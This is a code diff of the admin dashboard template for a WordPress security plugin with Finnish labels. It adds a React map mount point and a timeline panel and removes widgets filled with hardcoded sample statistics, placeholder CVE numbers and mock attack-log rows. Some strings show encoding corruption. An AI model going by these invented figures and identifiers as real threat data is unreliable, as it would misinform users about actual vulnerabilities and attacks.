@@ -38,24 +38,47 @@ if ( ! defined( 'ABSPATH' ) ) {
   font-family: 'Inter', system-ui, -apple-system, sans-serif;
 }
 
-/* Strip WP's own padding inside the content div */
-#wpbody-content { padding-bottom: 0 !important; }
+/* WordPress Admin Full-Height Resets */
+html.wp-toolbar {
+  overflow: hidden !important;
+}
+body.admin-bar {
+  overflow: hidden !important;
+}
+#wpfooter {
+  display: none !important;
+}
+#wpbody-content {
+  padding: 0 !important;
+  float: none !important;
+}
 #pecodex-security-dashboard-wrap,
 #pecodex-security-dashboard-wrap .wrap {
   margin: 0 !important;
   padding: 0 !important;
   max-width: none !important;
+  width: 100% !important;
+  height: calc(100vh - 32px) !important;
+  max-height: calc(100vh - 32px) !important;
+  overflow: hidden !important;
+}
+@media screen and (max-width: 782px) {
+  #pecodex-security-dashboard-wrap,
+  #pecodex-security-dashboard-wrap .wrap {
+    height: calc(100vh - 46px) !important;
+    max-height: calc(100vh - 46px) !important;
+  }
 }
 
-/* ä"?ä"? Layout ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"?ä"? */
-/* Fills the WP content area (after WP sidebar & admin bar) */
+/* ── Layout ── */
 #ps-shell {
   display: flex;
   width: 100%;
-  /* 32px = WP admin bar; adjust to 46px on mobile if needed */
-  height: calc(100vh - 32px);
+  height: 100%;
+  max-height: 100%;
+  min-height: 100%;
   overflow: hidden;
-  background: #1a1a2e;
+  background: #f8fafc;
   font-family: 'Inter', system-ui, sans-serif;
 }
 
@@ -882,9 +905,21 @@ if ( ! defined( 'ABSPATH' ) ) {
           </a>
         </li>
         <li>
+          <a href="#" onclick="psOpenModule('integrations'); return false;">
+            <span class="material-symbols-outlined">extension</span>
+            <span class="nav-label"><?php esc_html_e( 'Integraatiot', 'pecodex-security' ); ?></span>
+          </a>
+        </li>
+        <li>
           <a href="#" onclick="psOpenModule('notifications'); return false;">
             <span class="material-symbols-outlined">notifications</span>
             <span class="nav-label"><?php esc_html_e( 'Ilmoitukset', 'pecodex-security' ); ?></span>
+          </a>
+        </li>
+        <li>
+          <a href="#" onclick="psOpenModule('news'); return false;">
+            <span class="material-symbols-outlined">newspaper</span>
+            <span class="nav-label"><?php esc_html_e( 'Tietoturvauutiset', 'pecodex-security' ); ?></span>
           </a>
         </li>
         <li>
@@ -919,8 +954,8 @@ if ( ! defined( 'ABSPATH' ) ) {
   ä.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ää.ä -->
   <div id="ps-main">
 
-    <!-- Header -->
-    <header id="ps-header">
+    <!-- Header (Hidden when map is active) -->
+    <header id="ps-header" style="display:none;">
       <h1>Pecodex Security</h1>
       <div class="header-search">
         <span class="material-symbols-outlined">search</span>
@@ -928,48 +963,7 @@ if ( ! defined( 'ABSPATH' ) ) {
       </div>
       
       <div class="widget-toggles">
-        <button id="toggle-all-widgets" class="widget-toggle" title="Piilota kaikki widgetit" style="background: #f8fafc; color: #475569; border-color: #cbd5e1; margin-right: 8px;">
-          <span class="material-symbols-outlined" id="toggle-all-icon">visibility_off</span>
-        </button>
-        <button class="widget-toggle active" data-target="w-resources" title="Vaihda järjestelmäresurssit">
-          <span class="material-symbols-outlined">memory</span>
-        </button>
-        <button class="widget-toggle active" data-target="w-traffic" title="Vaihda Liikenne">
-          <span class="material-symbols-outlined">monitoring</span>
-        </button>
-        <button class="widget-toggle active" data-target="w-heatmap" title="Vaihda Uhkien Lähdekartta">
-          <span class="material-symbols-outlined">public</span>
-        </button>
-        <button class="widget-toggle active" data-target="w-log" title="Vaihda Reaaliaikainen Tapahtumaloki">
-          <span class="material-symbols-outlined">list_alt</span>
-        </button>
-        <button class="widget-toggle active" data-target="w-rate" title="Vaihda WAF-nopeusrajoitus">
-          <span class="material-symbols-outlined">speed</span>
-        </button>
-        <button class="widget-toggle active" data-target="w-node-health" title="Vaihda Solmun Tila">
-          <span class="material-symbols-outlined">hub</span>
-        </button>
-        <button class="widget-toggle active" data-target="w-payloads" title="Vaihda Estetyt Kuormat">
-          <span class="material-symbols-outlined">bug_report</span>
-        </button>
-        <button class="widget-toggle active" data-target="w-controls" title="Vaihda Hallinta">
-          <span class="material-symbols-outlined">admin_panel_settings</span>
-        </button>
-        <button class="widget-toggle active" data-target="w-malware" title="Vaihda Haittaohjelmat & Tiedostojen Eheys">
-          <span class="material-symbols-outlined">pest_control</span>
-        </button>
-        <button class="widget-toggle active" data-target="w-vulnerabilities" title="Vaihda Haavoittuvuushälytykset">
-          <span class="material-symbols-outlined">security_update_warning</span>
-        </button>
-        <button class="widget-toggle active" data-target="w-login-security" title="Vaihda Kirjautumisen Tietoturva">
-          <span class="material-symbols-outlined">no_accounts</span>
-        </button>
-        <button class="widget-toggle active" data-target="w-audit" title="Vaihda Tarkastusloki">
-          <span class="material-symbols-outlined">manage_search</span>
-        </button>
-        <button class="widget-toggle active" data-target="w-hardening" title="Vaihda Järjestelmän Suojaus">
-          <span class="material-symbols-outlined">shield_with_heart</span>
-        </button>
+        <!-- Kept for compatibility if other modules need it, though hidden -->
       </div>
 
       <div class="header-actions">
@@ -981,477 +975,347 @@ if ( ! defined( 'ABSPATH' ) ) {
       </div>
     </header>
 
-    <!-- Map + Widget area -->
-    <div id="ps-map-area">
+    <!-- React Map App Mount Point -->
+    <div id="ps-map-area" style="position:relative; width:100%; height:100%; flex:1; min-height:0; overflow-y:auto; background:#f9fafb; display:flex; flex-direction:column;">
+      <div id="root" style="flex:1;"></div>
+      
+      <!-- Wayback Timeline UI (Compact White Theme) -->
+      <style>
+        #ps-timeline-panel {
+          width: 100%;
+          background: #ffffff;
+          border-top: 1px solid #e2e8f0;
+          display: flex;
+          flex-direction: column;
+          flex-shrink: 0;
+          font-family: 'Inter', system-ui, sans-serif;
+          color: #1e293b;
+          box-shadow: 0 -4px 12px rgba(0,0,0,0.02);
+        }
+        .tl-date-carousel {
+          display: flex;
+          overflow-x: auto;
+          gap: 6px;
+          padding: 8px 16px;
+          scroll-snap-type: x mandatory;
+          scroll-behavior: smooth;
+          border-bottom: 1px solid #f1f5f9;
+          -ms-overflow-style: none;
+          scrollbar-width: none;
+        }
+        .tl-date-carousel::-webkit-scrollbar { display: none; }
+        .tl-date-btn {
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          justify-content: center;
+          min-width: 64px;
+          padding: 4px 0;
+          border-radius: 6px;
+          scroll-snap-align: center;
+          transition: all 0.2s;
+          border: 1px solid #e2e8f0;
+          background: #f8fafc;
+          color: #64748b;
+          cursor: pointer;
+        }
+        .tl-date-btn:hover {
+          background: #f1f5f9;
+          border-color: #cbd5e1;
+          color: #334155;
+        }
+        .tl-date-btn[data-active="true"] {
+          background: #b80048;
+          border-color: #9c003d;
+          box-shadow: 0 2px 6px rgba(184, 0, 72, 0.2);
+          color: #fff;
+        }
+        .tl-date-day {
+          font-size: 9px;
+          text-transform: uppercase;
+          font-weight: 700;
+          letter-spacing: 0.05em;
+          color: inherit;
+          opacity: 0.8;
+        }
+        .tl-date-val {
+          font-size: 12px;
+          font-weight: 600;
+        }
+        .tl-slider-row {
+          display: flex;
+          align-items: flex-end;
+          gap: 12px;
+          padding: 28px 16px 12px;
+          position: relative;
+        }
+        .tl-time-display {
+          font-size: 15px;
+          font-weight: 700;
+          font-variant-numeric: tabular-nums;
+          letter-spacing: 0.5px;
+          color: #0f172a;
+          min-width: 48px;
+          margin-bottom: 2px;
+        }
+        .tl-slider-container {
+          flex: 1;
+          position: relative;
+          height: 38px;
+          display: flex;
+          align-items: flex-end;
+        }
+        input[type=range].tl-range {
+          width: 100%;
+          -webkit-appearance: none;
+          background: transparent;
+          cursor: pointer;
+          pointer-events: none; /* Let clicks pass through to markers */
+          position: relative;
+          z-index: 10;
+          margin: 0;
+          padding: 0;
+        }
+        input[type=range].tl-range:focus { outline: none; }
+        input[type=range].tl-range::-webkit-slider-runnable-track {
+          width: 100%;
+          height: 4px;
+          background: #cbd5e1;
+          border-radius: 99px;
+        }
+        input[type=range].tl-range::-webkit-slider-thumb {
+          height: 16px;
+          width: 16px;
+          border-radius: 50%;
+          background: #b80048;
+          cursor: pointer;
+          -webkit-appearance: none;
+          margin-top: -6px;
+          box-shadow: 0 2px 6px rgba(184,0,72,0.4);
+          border: 2px solid #fff;
+          pointer-events: auto; /* Thumb remains draggable */
+        }
+        input[type=range].tl-range::-moz-range-thumb {
+          height: 16px;
+          width: 16px;
+          border-radius: 50%;
+          background: #b80048;
+          cursor: pointer;
+          box-shadow: 0 2px 6px rgba(184,0,72,0.4);
+          border: 2px solid #fff;
+          pointer-events: auto;
+        }
+        .tl-controls-row {
+          display: flex;
+          align-items: center;
+          justify-content: space-between;
+          padding: 0 16px 10px;
+        }
+        .tl-play-btn {
+          width: 28px;
+          height: 28px;
+          border-radius: 50%;
+          background: #f1f5f9;
+          border: 1px solid #e2e8f0;
+          color: #475569;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          cursor: pointer;
+          transition: all 0.2s;
+        }
+        .tl-play-btn:hover { background: #e2e8f0; color: #0f172a; }
+        .tl-speed-group {
+          display: flex;
+          background: #f8fafc;
+          border: 1px solid #e2e8f0;
+          border-radius: 6px;
+          overflow: hidden;
+          margin-left: 10px;
+        }
+        .tl-speed-btn {
+          background: transparent;
+          border: none;
+          color: #64748b;
+          font-size: 11px;
+          font-weight: 600;
+          padding: 4px 8px;
+          cursor: pointer;
+          transition: all 0.2s;
+        }
+        .tl-speed-btn.active {
+          background: #e2e8f0;
+          color: #0f172a;
+        }
+        .tl-mode-group {
+          display: flex;
+          background: #f8fafc;
+          border: 1px solid #e2e8f0;
+          border-radius: 6px;
+          overflow: hidden;
+        }
+        .tl-mode-btn {
+          background: transparent;
+          border: none;
+          color: #64748b;
+          font-size: 11px;
+          font-weight: 600;
+          padding: 4px 10px;
+          cursor: pointer;
+          transition: all 0.2s;
+        }
+        .tl-mode-btn.active {
+          background: #b80048;
+          color: #fff;
+        }
+      </style>
+      
+      <div id="ps-timeline-panel" style="position: relative; z-index: 9999;">
+        <!-- Date Carousel Wrapper -->
+        <div class="tl-carousel-wrapper" style="display:flex; align-items:center; position:relative; padding: 0 10px; margin-top: 5px; gap: 4px;">
+          
+          <div style="position:relative;">
+            <button id="tl-month-toggle" style="background:transparent; border:none; color:#64748b; cursor:pointer; padding:6px; border-radius:50%; display:flex; align-items:center; justify-content:center; transition:0.2s;" onmouseover="this.style.background='#f1f5f9';this.style.color='#0f172a'" onmouseout="this.style.background='transparent';this.style.color='#64748b'">
+              <span class="material-symbols-outlined" style="font-size:20px;">calendar_month</span>
+            </button>
+            <div id="tl-month-dropdown" style="display:none; position:absolute; bottom:36px; left:0; background:#fff; border:1px solid #e2e8f0; border-radius:8px; box-shadow:0 10px 25px rgba(0,0,0,0.2); z-index:99999; min-width:140px; padding:8px;">
+              <div style="font-size:10px; font-weight:700; color:#94a3b8; padding:4px 8px; text-transform:uppercase;">Valitse kuukausi</div>
+              <div id="tl-month-list" style="display:flex; flex-direction:column; gap:2px; max-height:200px; overflow-y:auto;">
+                <!-- Populated by JS -->
+              </div>
+            </div>
+          </div>
 
-      <!-- LIVE RADAR badge overlay -->
-      <div id="ps-live-badge" style="position:absolute;top:12px;left:50%;transform:translateX(-50%);z-index:800;display:flex;align-items:center;gap:8px;background:rgba(15,23,42,0.82);backdrop-filter:blur(8px);padding:6px 16px;border-radius:999px;border:1px solid rgba(255,255,255,0.1);pointer-events:none;">
-        <span style="width:8px;height:8px;border-radius:50%;background:#22c55e;display:inline-block;animation:pulse-dot 1.5s ease-in-out infinite;"></span>
-        <span style="font-size:12px;font-weight:600;color:#f1f5f9;letter-spacing:0.05em;">LIVE RADAR</span>
-        <span id="live-event-count" style="font-size:11px;background:rgba(99,102,241,0.3);color:#a5b4fc;padding:1px 8px;border-radius:999px;font-weight:700;">0</span>
-        <span style="font-size:11px;color:#94a3b8;">events</span>
+          <button id="tl-nav-left" style="background:transparent; border:none; color:#64748b; cursor:pointer; padding:4px; border-radius:50%; display:flex; align-items:center; justify-content:center; transition:0.2s;" onmouseover="this.style.background='#f1f5f9';this.style.color='#0f172a'" onmouseout="this.style.background='transparent';this.style.color='#64748b'">
+            <span class="material-symbols-outlined" style="font-size:20px;">chevron_left</span>
+          </button>
+          
+          <div class="tl-date-carousel" id="tl-dates" style="flex:1; scroll-behavior: smooth;">
+            <!-- Populated by JS -->
+          </div>
+
+          <button id="tl-nav-right" style="background:transparent; border:none; color:#64748b; cursor:pointer; padding:4px; border-radius:50%; display:flex; align-items:center; justify-content:center; transition:0.2s;" onmouseover="this.style.background='#f1f5f9';this.style.color='#0f172a'" onmouseout="this.style.background='transparent';this.style.color='#64748b'">
+            <span class="material-symbols-outlined" style="font-size:20px;">chevron_right</span>
+          </button>
+        </div>
+
+        <!-- Slider Row -->
+        <div class="tl-slider-row">
+          <div class="tl-time-display" id="tl-current-time">LIVE</div>
+          <div class="tl-slider-container" style="position: relative;">
+            <div id="tl-track-markers" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1;"></div>
+            <input type="range" class="tl-range" id="tl-slider" min="0" max="72" value="0" step="1" style="position: relative; z-index: 2; background: transparent;">
+          </div>
+        </div>
+
+        <!-- Controls Row -->
+        <div class="tl-controls-row">
+          <div style="display:flex; align-items:center;">
+            <button class="tl-play-btn" id="tl-play-btn"><span class="material-symbols-outlined" style="font-size:16px;">play_arrow</span></button>
+            <div class="tl-speed-group">
+              <button class="tl-speed-btn active">1x</button>
+              <button class="tl-speed-btn">60x</button>
+              <button class="tl-speed-btn">600x</button>
+            </div>
+            <button id="tl-clear-focus-btn" style="display: none; margin-left: 12px; background: #fee2e2; border: 1px solid #fca5a5; border-radius: 6px; padding: 4px 10px; font-size: 11px; font-weight: 700; color: #991b1b; cursor: pointer; align-items: center; gap: 4px; transition: 0.2s;" onmouseover="this.style.background='#fecaca'" onmouseout="this.style.background='#fee2e2'">
+              <span class="material-symbols-outlined" style="font-size: 15px;">close</span>
+              Poista focus
+            </button>
+            <button id="tl-all-day-btn" style="margin-left: 12px; background: #ffffff; border: 1px solid #cbd5e1; border-radius: 6px; padding: 4px 10px; font-size: 11px; font-weight: 700; color: #334155; cursor: pointer; display: flex; align-items: center; gap: 4px; transition: 0.2s;" onmouseover="if(!this.disabled) this.style.background='#f1f5f9'" onmouseout="if(!this.disabled) this.style.background='#ffffff'">
+              <span class="material-symbols-outlined" style="font-size: 15px; color: #b80048;">layers</span>
+              Kaikki päivän tapahtumat
+            </button>
+          </div>
+          <div class="tl-mode-group">
+            <button class="tl-mode-btn active" id="tl-mode-live">LIVE</button>
+            <button class="tl-mode-btn" id="tl-mode-history">HISTORY</button>
+          </div>
+        </div>
       </div>
-
-      <!-- Leaflet map -->
-      <div id="security-map"></div>
-
-      <!-- Attack lines SVG (screen-space, managed by JS) -->
-      <svg id="attack-svg" style="position:absolute;inset:0;width:100%;height:100%;z-index:5;pointer-events:none;overflow:visible;">
-        <defs>
-          <marker id="arrow-red" markerWidth="6" markerHeight="6" refX="3" refY="3" orient="auto">
-            <path d="M0,0 L6,3 L0,6 Z" fill="#dc2626"/>
-          </marker>
-          <marker id="arrow-yellow" markerWidth="6" markerHeight="6" refX="3" refY="3" orient="auto">
-            <path d="M0,0 L6,3 L0,6 Z" fill="#f59e0b"/>
-          </marker>
-          <marker id="arrow-green" markerWidth="6" markerHeight="6" refX="3" refY="3" orient="auto">
-            <path d="M0,0 L6,3 L0,6 Z" fill="#22c55e"/>
-          </marker>
-        </defs>
-        <!-- Paths drawn by JS after map tiles load -->
-      </svg>
-
-      <!-- Widgets overlay (on map) -->
-      <div id="ps-widgets" class="dashboard-grid">
-        <div id="maximize-backdrop"></div>
-        
-        <div class="grid-cell" id="cell-0" data-cell="0">
-          <!-- 1. System Resources -->
-          <div class="glass-card widget-resources" id="w-resources">
-            <span class="material-symbols-outlined drag-handle">drag_indicator</span><button class="widget-maximize" title="Suurenna"><span class="material-symbols-outlined">open_in_full</span></button>
-            <h4>
-              <span class="material-symbols-outlined">memory</span>
-              Järjestelmäresurssit
-            </h4>
-            <div class="res-row">
-              <div class="res-row-head"><span>Suorittimen Käyttö</span><span>42%</span></div>
-              <div class="res-bar"><div class="res-bar-fill" style="width:42%"></div></div>
-            </div>
-            <div class="res-row">
-              <div class="res-row-head"><span>Muisti</span><span>6.4GB / 16GB</span></div>
-              <div class="res-bar"><div class="res-bar-fill" style="width:40%"></div></div>
-            </div>
-          </div>
-        </div>
-
-        <div class="grid-cell" id="cell-1" data-cell="1">
-          <!-- 3. Uhan Lähde Heatmap [NEW] -->
-          <div class="glass-card p-4 w-[360px]" id="w-heatmap">
-            <span class="material-symbols-outlined drag-handle" style="top:12px;left:12px;">drag_indicator</span><button class="widget-maximize" title="Suurenna"><span class="material-symbols-outlined">open_in_full</span></button>
-            <div class="flex items-center gap-2 mb-3 mt-1 ml-5">
-              <span class="material-symbols-outlined text-pink-600">public</span>
-              <h3 class="font-bold text-slate-800 text-sm">Pahimmat Hyökkääjät</h3>
-            </div>
-            <div class="flex flex-col gap-2">
-              <div class="flex items-center justify-between text-xs">
-                <div class="flex items-center gap-2"><span class="w-4 h-3 bg-red-500 rounded-sm"></span> CN (Beijing)</div>
-                <span class="font-mono font-bold text-slate-700">14,205</span>
-              </div>
-              <div class="flex items-center justify-between text-xs">
-                <div class="flex items-center gap-2"><span class="w-4 h-3 bg-orange-500 rounded-sm"></span> IR (Tehran)</div>
-                <span class="font-mono font-bold text-slate-700">8,102</span>
-              </div>
-              <div class="flex items-center justify-between text-xs">
-                <div class="flex items-center gap-2"><span class="w-4 h-3 bg-yellow-500 rounded-sm"></span> RU (Moscow)</div>
-                <span class="font-mono font-bold text-slate-700">5,433</span>
-              </div>
-              <div class="flex items-center justify-between text-xs">
-                <div class="flex items-center gap-2"><span class="w-4 h-3 bg-blue-500 rounded-sm"></span> US (Ashburn)</div>
-                <span class="font-mono font-bold text-slate-700">2,110</span>
-              </div>
-            </div>
-          </div>
-          <!-- Vulnerability Alerts [NEW] -->
-          <div class="glass-card p-4 w-[360px]" id="w-vulnerabilities">
-            <span class="material-symbols-outlined drag-handle" style="top:12px;left:12px;">drag_indicator</span><button class="widget-maximize" title="Suurenna"><span class="material-symbols-outlined">open_in_full</span></button>
-            <div class="flex items-center justify-between mb-3 mt-1 ml-5">
-              <div class="flex items-center gap-2">
-                <span class="material-symbols-outlined text-red-600">security_update_warning</span>
-                <h3 class="font-bold text-slate-800 text-sm">Haavoittuvuudet</h3>
-              </div>
-              <span class="bg-red-100 text-red-800 text-[10px] font-bold px-2 py-0.5 rounded-full">3 Kriittistä</span>
-            </div>
-            <div class="flex flex-col gap-2">
-              <div class="flex justify-between items-center text-xs p-2 bg-red-50 border border-red-100 rounded">
-                <div>
-                  <div class="font-bold text-slate-800">WooCommerce</div>
-                  <div class="text-[10px] text-slate-500">CVE-2024-1234 (RCE)</div>
-                </div>
-                <button class="text-[10px] bg-white border border-slate-200 px-2 py-1 rounded font-bold hover:bg-slate-50">Päivitä</button>
-              </div>
-              <div class="flex justify-between items-center text-xs p-2 bg-orange-50 border border-orange-100 rounded">
-                <div>
-                  <div class="font-bold text-slate-800">Elementor</div>
-                  <div class="text-[10px] text-slate-500">CVE-2024-5678 (XSS)</div>
-                </div>
-                <button class="text-[10px] bg-white border border-slate-200 px-2 py-1 rounded font-bold hover:bg-slate-50">Päivitä</button>
-              </div>
-            </div>
-            <div class="widget-settings-panel">
-              <h4 class="text-sm font-bold text-slate-700 mb-2">Asetukset</h4>
-              <label class="flex items-center gap-2 text-xs text-slate-600 mb-2">
-                <input type="checkbox" checked class="rounded border-slate-300 text-pink-600 focus:ring-pink-500">
-                Päivitä kriittiset haavoittuvuudet automaattisesti
-              </label>
-              <label class="flex items-center gap-2 text-xs text-slate-600">
-                <input type="checkbox" class="rounded border-slate-300 text-pink-600 focus:ring-pink-500">
-                Lähetä sähköposti-ilmoitus uusista uhista
-              </label>
-            </div>
-          </div>
-        </div>
-
-        <div class="grid-cell" id="cell-2" data-cell="2">
-          <!-- 4. Tactical Modules (20) -->
-          <div class="glass-card widget-controls" id="w-controls" style="width: 580px;">
-            <span class="material-symbols-outlined drag-handle" style="top:12px;left:12px;">drag_indicator</span><button class="widget-maximize" title="Suurenna"><span class="material-symbols-outlined">open_in_full</span></button>
-            <div class="widget-controls-inner" style="height: auto; padding: 18px;">
-              <div class="ctrl-header" style="margin-left: 12px; margin-bottom: 12px;">
-                <span class="material-symbols-outlined text-blue-600">security</span>
-                <h3 style="font-size: 16px; text-transform: uppercase; letter-spacing: 1px;">Tietoturvamoduulit (20)</h3>
-              </div>
-              <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; max-height: 380px; overflow-y: auto; padding-right: 8px;">
-                <?php
-                $active_modules = get_option('pmc_active_modules', array());
-                $is_first_run = empty($active_modules);
-                
-                $modules = [
-                  ['id' => 'waf', 'name' => 'WAF-moottori', 'icon' => 'shield', 'color' => '#3b82f6'],
-                  ['id' => 'bot', 'name' => 'Bottisuojaus', 'icon' => 'smart_toy', 'color' => '#14b8a6'],
-                  ['id' => 'geoip', 'name' => 'GeoIP-säännöt', 'icon' => 'public', 'color' => '#6366f1'],
-                  ['id' => 'honeypot', 'name' => 'Hunajapurkit', 'icon' => 'bug_report', 'color' => '#ec4899'],
-                  ['id' => 'zerotrust', 'name' => 'Zero Trust', 'icon' => 'fingerprint', 'color' => '#a855f7'],
-                  ['id' => 'webauthn', 'name' => 'WebAuthn', 'icon' => 'passkey', 'color' => '#22c55e'],
-                  ['id' => 'lockdown', 'name' => 'Sulkutila', 'icon' => 'lock_person', 'color' => '#ef4444'],
-                  ['id' => 'firewall', 'name' => 'Verkkopalomuuri', 'icon' => 'router', 'color' => '#f97316'],
-                  ['id' => 'hardening', 'name' => 'Ytimen Suojaus', 'icon' => 'gpp_good', 'color' => '#14b8a6'],
-                  ['id' => 'advanced', 'name' => 'Kehittynyt AI-turva', 'icon' => 'memory', 'color' => '#6366f1'],
-                  ['id' => 'scanner', 'name' => 'Haittaohjelmien Skanneri', 'icon' => 'troubleshoot', 'color' => '#3b82f6'],
-                  ['id' => 'deepscanner', 'name' => 'Syväheuristiikka', 'icon' => 'biotech', 'color' => '#ec4899'],
-                  ['id' => 'captcha', 'name' => 'ä"lykäs Captcha', 'icon' => 'fact_check', 'color' => '#f97316'],
-                  ['id' => 'telemetry', 'name' => 'Reaaliaikainen Telemetria', 'icon' => 'radar', 'color' => '#3b82f6'],
-                  ['id' => 'cache', 'name' => 'Turvallinen Välimuisti', 'icon' => 'cached', 'color' => '#22c55e'],
-                  ['id' => 'encryption', 'name' => 'Tietojen Salaus', 'icon' => 'key', 'color' => '#a855f7'],
-                  ['id' => 'appsec', 'name' => 'Sovellusturva', 'icon' => 'app_blocking', 'color' => '#ef4444'],
-                  ['id' => 'audit', 'name' => 'Tarkastusloki', 'icon' => 'manage_search', 'color' => '#14b8a6'],
-                  ['id' => 'auth', 'name' => 'Tunnistautumisen Suojat', 'icon' => 'admin_panel_settings', 'color' => '#6366f1'],
-                  ['id' => 'wizard', 'name' => 'API-yhdyskäytävä', 'icon' => 'api', 'color' => '#3b82f6'],
-                ];
-                foreach ($modules as $mod):
-                  $is_active = $is_first_run ? true : !empty($active_modules[$mod['id']]);
-                  $checked = $is_active ? 'checked' : '';
-                ?>
-                <div class="ctrl-row" style="background: rgba(255,255,255,0.6); border: 1px solid rgba(0,0,0,0.05); padding: 8px 12px; border-radius: 8px; transition: background 0.2s;" onmouseover="this.style.background='rgba(255,255,255,0.9)'" onmouseout="this.style.background='rgba(255,255,255,0.6)'">
-                  <div style="display: flex; align-items: center; gap: 8px;">
-                    <span class="material-symbols-outlined" style="color: <?php echo $mod['color']; ?>; font-size: 18px;"><?php echo $mod['icon']; ?></span>
-                    <span style="font-weight: 700; color: #334155; font-size: 13px;"><?php echo $mod['name']; ?></span>
-                  </div>
-                  <label class="toggle-wrap">
-                    <input type="checkbox" class="module-toggle-checkbox" data-module="<?php echo esc_attr($mod['id']); ?>" <?php echo $checked; ?> onchange="pmcSaveActiveModules()"/>
-                    <span class="toggle-track"><span class="toggle-thumb"></span></span>
-                  </label>
-                </div>
-                <?php endforeach; ?>
-              </div>
-              <div class="ctrl-footer" style="margin-top: 14px; border-top: 1px solid rgba(0,0,0,0.05); padding-top: 14px;">
-                <button class="btn-lockdown" onclick="triggerLockdown()" style="width: 100%; background: #ef4444; color: #fff; border: none; font-size: 14px; padding: 12px; border-radius: 8px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; box-shadow: 0 4px 12px rgba(239, 68, 68, 0.4); transition: transform 0.1s, box-shadow 0.1s;" onmouseover="this.style.transform='scale(1.01)'; this.style.boxShadow='0 6px 16px rgba(239, 68, 68, 0.6)'" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 4px 12px rgba(239, 68, 68, 0.4)'">
-                  <span class="material-symbols-outlined" style="margin-right: 8px;">dangerous</span>
-                  Käynnistä Täysi Sulkutila
-                </button>
-              </div>
-            </div>
-          </div>
-        </div>
-
-        <div class="grid-cell" id="cell-3" data-cell="3">
-          <!-- 5. Live Event Log -->
-          <div class="glass-card widget-log" id="w-log">
-            <span class="material-symbols-outlined drag-handle" style="top:10px;left:10px;">drag_indicator</span><button class="widget-maximize" title="Suurenna"><span class="material-symbols-outlined">open_in_full</span></button>
-            <div class="widget-log-inner">
-              <div class="log-header">
-                <h3>Reaaliaikainen Tapahtumaloki</h3>
-                <span class="badge-active"><span class="badge-dot"></span>Aktiivinen Seuranta</span>
-              </div>
-              <div class="log-table-wrap">
-                <table class="log-table">
-                  <thead>
-                    <tr>
-                      <th>Aikaleima (UTC)</th>
-                      <th>Lähde</th>
-                      <th>Kohde</th>
-                      <th>Hyökkäys</th>
-                      <th style="text-align:right">Status</th>
-                    </tr>
-                  </thead>
-                  <tbody id="event-log-body">
-                    <tr>
-                      <td class="td-time">14:32:01</td>
-                      <td>CN ä?" Beijing</td>
-                      <td>Helsinki-Edge-4</td>
-                      <td>DDoS</td>
-                      <td style="text-align:right"><span class="badge-status badge-critical">Kriittinen</span></td>
-                    </tr>
-                    <tr>
-                      <td class="td-time">14:31:45</td>
-                      <td>US ä?" Ashburn</td>
-                      <td>Vantaa-DC-01</td>
-                      <td>SQLi</td>
-                      <td style="text-align:right"><span class="badge-status badge-blocked">Estetty</span></td>
-                    </tr>
-                  </tbody>
-                </table>
-              </div>
-            </div>
-          </div>
-          <!-- Audit Trail [NEW] -->
-          <div class="glass-card p-4 w-[500px]" id="w-audit">
-            <span class="material-symbols-outlined drag-handle" style="top:12px;left:12px;">drag_indicator</span><button class="widget-maximize" title="Suurenna"><span class="material-symbols-outlined">open_in_full</span></button>
-            <div class="flex items-center gap-2 mb-3 mt-1 ml-5">
-              <span class="material-symbols-outlined text-slate-600">manage_search</span>
-              <h3 class="font-bold text-slate-800 text-sm">Tarkastusloki</h3>
-            </div>
-            <div class="flex flex-col gap-2">
-              <div class="flex gap-3 text-xs border-b border-slate-100 pb-2">
-                <span class="text-slate-400 font-mono">14:22</span>
-                <span class="font-bold text-indigo-600 w-16">pepeu</span>
-                <span class="text-slate-700">Deaktivoi lisäosan <span class="font-mono bg-slate-100 px-1 rounded">hello-dolly</span></span>
-              </div>
-              <div class="flex gap-3 text-xs border-b border-slate-100 pb-2">
-                <span class="text-slate-400 font-mono">13:05</span>
-                <span class="font-bold text-indigo-600 w-16">admin</span>
-                <span class="text-slate-700">Muutti WP-asetuksia (Kestolinkit)</span>
-              </div>
-              <div class="flex gap-3 text-xs border-b border-slate-100 pb-2">
-                <span class="text-slate-400 font-mono">10:14</span>
-                <span class="font-bold text-red-600 w-16">SYSTEM</span>
-                <span class="text-slate-700">Estetty 45 kirjautumisyritystä osoitteesta <span class="font-mono bg-red-50 text-red-700 px-1 rounded">192.168.1.1</span></span>
-              </div>
-            </div>
-          </div>
-        </div>
-
-        <div class="grid-cell" id="cell-4" data-cell="4">
-          <!-- Center is empty by default -->
-        </div>
-
-        <div class="grid-cell" id="cell-5" data-cell="5">
-          <!-- 2. Traffic -->
-          <div class="glass-card widget-traffic" id="w-traffic">
-            <span class="material-symbols-outlined drag-handle">drag_indicator</span><button class="widget-maximize" title="Suurenna"><span class="material-symbols-outlined">open_in_full</span></button>
-            <h4>
-              <span class="material-symbols-outlined">monitoring</span>
-              Liikenne
-            </h4>
-            <div class="traffic-val">1.2<span> GB/s</span></div>
-            <div class="traffic-label">Saapuva</div>
-            <div class="traffic-bars">
-              <div class="traffic-bar" style="height:40%"></div>
-              <div class="traffic-bar" style="height:60%"></div>
-              <div class="traffic-bar active" style="height:100%"></div>
-              <div class="traffic-bar" style="height:55%"></div>
-              <div class="traffic-bar" style="height:30%"></div>
-            </div>
-          </div>
-          <!-- System Hardening [NEW] -->
-          <div class="glass-card p-4 w-[280px]" id="w-hardening">
-            <span class="material-symbols-outlined drag-handle" style="top:12px;left:12px;">drag_indicator</span><button class="widget-maximize" title="Suurenna"><span class="material-symbols-outlined">open_in_full</span></button>
-            <div class="flex items-center gap-2 mb-3 mt-1 ml-5">
-              <span class="material-symbols-outlined text-teal-600">shield_with_heart</span>
-              <h3 class="font-bold text-slate-800 text-sm">Järjestelmän Suojaus</h3>
-            </div>
